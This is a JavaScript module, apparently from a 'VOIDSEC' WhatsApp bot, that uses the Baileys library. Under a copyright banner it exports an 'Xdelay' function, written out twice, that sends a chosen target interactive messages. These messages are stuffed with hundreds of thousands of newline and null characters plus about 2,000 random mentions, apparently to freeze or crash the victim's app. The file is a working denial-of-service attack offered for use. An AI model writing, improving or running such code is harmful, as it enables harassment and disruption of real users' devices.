/*
 * © 2026 Legend Bahirava (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://www.youtube.com/@bahiravabahirava-e1p5m
 * Instagram : LG_Bahirava
 * Telegram  : https://t.me/LG_BAHIRAVA
 * WhatsApp  : +94704703791
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

const { generateWAMessage, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

/*async function Xdelay(SYxS7, target) {
  const nameVnX = [
    "address_message", 
    "galaxy_message",
    "call_permission_request"
  ];

  await SYxS7.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "VnX Anti Ampos",
            format: 1
          },
          nativeFlowResponseMessage: {
            name: nameVnX[1], 
            paramsJson: `{"wa_flow_response_params":{"VnX Nihk":"${"\n".repeat(250000)}"}}`,
            version: 3
          }
        }
      }
    }
  }, { participant: { jid: target } });
    
  await SYxS7.sendMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "VnX Is Here",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"VnX","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\u0000".repeat(1000000)}"}}`,
            version: 3
          }
        }
      }
    },
    contextInfo: { 
      remoteJid: "#VnXNew - By @Raffioffci5",
      mentionedJid: [
        '0@s.whatsapp.net',
        ...Array.from(
          { length: 2000 },
          () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net'
        )
      ]
    }
  }, { participant: { jid: target } });

  let vnxdelayinv = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "VnX 2 Combo hard Delay To Kill You",
            format: 1
          },
          nativeFlowResponseMessage: {
            name: nameVnX[0],
            paramsJson: "\n".repeat(250000) + "\u0000".repeat(250000),
            version: 3
          }
        }
      }
    }
  };

  await SYxS7.relayMessage(target, vnxdelayinv, { 
    participant: { jid: target } 
  });
}
*/

async function Xdelay(SYxS7, target) {
  const nameVnX = [
    "address_message", 
    "galaxy_message",
    "call_permission_request"
  ];

  await SYxS7.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "VnX Anti Ampos",
            format: 1
          },
          nativeFlowResponseMessage: {
            name: nameVnX[1], 
            paramsJson: `{"wa_flow_response_params":{"VnX Nihk":"${"\n".repeat(250000)}"}}`,
            version: 3
          }
        }
      }
    }
  }, { participant: { jid: target } });
    
  await SYxS7.sendMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "VnX Is Here",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"VnX","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\u0000".repeat(1000000)}"}}`,
            version: 3
          }
        }
      }
    },
    contextInfo: { 
      remoteJid: "#VnXNew - By @Raffioffci5",
      mentionedJid: [
        '0@s.whatsapp.net',
        ...Array.from(
          { length: 2000 },
          () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net'
        )
      ]
    }
  }, { participant: { jid: target } });

  let vnxdelayinv = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "VnX 2 Combo hard Delay To Kill You",
            format: 1
          },
          nativeFlowResponseMessage: {
            name: nameVnX[0],
            paramsJson: "\n".repeat(250000) + "\u0000".repeat(250000),
            version: 3
          }
        }
      }
    }
  };

  await SYxS7.relayMessage(target, vnxdelayinv, { 
    participant: { jid: target } 
  });
}

module.exports = { Xdelay };